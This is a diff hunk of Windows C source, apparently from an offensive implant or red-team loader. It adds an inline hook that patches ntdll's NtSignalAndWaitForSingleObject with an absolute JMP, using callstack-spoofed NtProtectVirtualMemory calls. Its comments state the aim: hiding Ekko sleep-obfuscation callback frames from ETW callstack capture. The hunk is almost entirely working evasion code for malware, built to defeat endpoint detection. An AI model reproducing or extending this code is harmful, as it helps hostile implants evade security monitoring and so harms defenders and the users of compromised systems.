@@ -1552,3 +1552,81 @@ LPVOID WINAPI _CreateFiberEx( SIZE_T dwStackCommitSize, SIZE_T dwStackReserveSiz
     call.args[4] = spoof_arg(lpParameter);
     return (LPVOID)spoof_call(&call);
 }
+
+/* ======================================================================== */
+/* NTDLL inline hook — NtSignalAndWaitForSingleObject (Ekko callstack fix)  */
+/*                                                                           */
+/* Ekko resolved APIs via hash-walking, bypassing Crystal Palace's IAT      */
+/* hooks. We patch the NTDLL stub directly with a 14-byte absolute JMP so   */
+/* spoof_call fires regardless, hiding all Ekko PIC-callback frames from    */
+/* ETW callstack capture.                                                    */
+/* ======================================================================== */
+
+static NTSTATUS NTAPI _ntSAWFSO_handler(
+    HANDLE         SignalHandle,
+    HANDLE         WaitHandle,
+    BOOLEAN        Alertable,
+    PLARGE_INTEGER Timeout );
+
+void ekko_hooks_setup( PVOID ntdll, FARPROC gpa )
+{
+    if ( !g_gates.NtSignalAndWaitForSingleObject.jmpAddr )
+        return;
+
+    typedef FARPROC (WINAPI *pfnGPA)( HMODULE, LPCSTR );
+    PVOID target = (PVOID)( (pfnGPA)gpa )( (HMODULE)ntdll, "NtSignalAndWaitForSingleObject" );
+    if ( !target )
+        return;
+
+    PVOID  page    = target;
+    SIZE_T size    = 14;
+    ULONG  oldProt = 0;
+    ULONG  dummy   = 0;
+
+    FUNCTION_CALL call = { 0 };
+
+    /* make the page writable */
+    GATE_CALL( call, g_gates.NtProtectVirtualMemory );
+    call.argc    = 5;
+    call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
+    call.args[1] = spoof_arg( &page );
+    call.args[2] = spoof_arg( &size );
+    call.args[3] = spoof_arg( (ULONG)PAGE_EXECUTE_READWRITE );
+    call.args[4] = spoof_arg( &oldProt );
+    spoof_call( &call );
+
+    /* write 14-byte absolute JMP: FF 25 00 00 00 00 <8-byte addr> */
+    BYTE  *dst  = (BYTE *)target;
+    PVOID  hook = (PVOID)_ntSAWFSO_handler;
+    dst[0] = 0xFF; dst[1] = 0x25;
+    dst[2] = dst[3] = dst[4] = dst[5] = 0x00;
+    *(PVOID *)(dst + 6) = hook;
+
+    /* restore original protection */
+    page = target;
+    size = 14;
+    GATE_CALL( call, g_gates.NtProtectVirtualMemory );
+    call.argc    = 5;
+    call.args[0] = spoof_arg( (HANDLE)(LONG_PTR)-1 );
+    call.args[1] = spoof_arg( &page );
+    call.args[2] = spoof_arg( &size );
+    call.args[3] = spoof_arg( oldProt );
+    call.args[4] = spoof_arg( &dummy );
+    spoof_call( &call );
+}
+
+static NTSTATUS NTAPI _ntSAWFSO_handler(
+    HANDLE         SignalHandle,
+    HANDLE         WaitHandle,
+    BOOLEAN        Alertable,
+    PLARGE_INTEGER Timeout )
+{
+    FUNCTION_CALL call = { 0 };
+    GATE_CALL( call, g_gates.NtSignalAndWaitForSingleObject );
+    call.argc    = 4;
+    call.args[0] = spoof_arg( SignalHandle );
+    call.args[1] = spoof_arg( WaitHandle );
+    call.args[2] = spoof_arg( (ULONG_PTR)(BOOLEAN)Alertable );
+    call.args[3] = spoof_arg( Timeout );
+    return (NTSTATUS)spoof_call( &call );
+}
